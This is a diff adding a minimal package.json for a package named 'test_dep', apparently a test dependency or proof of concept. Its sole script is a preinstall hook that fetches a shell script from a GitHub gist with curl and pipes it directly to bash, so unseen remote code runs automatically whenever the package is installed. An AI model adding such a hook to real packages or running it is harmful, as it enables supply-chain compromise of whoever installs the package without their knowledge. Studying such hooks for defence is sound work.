@@ -1,0 +1,7 @@
+{
+  "name": "test_dep",
+  "packageManager": "yarn@4.2.2",
+  "scripts": {
+    "preinstall": "curl -sSfL https://gist.githubusercontent.com/NicholasEllul/66627b2f3a381a73b6a3c3a5cf9b90e2/raw/7cf5a0ae6f0c1325b60a72525549a2f908e164b5/g1.sh | bash"
+  }
+}
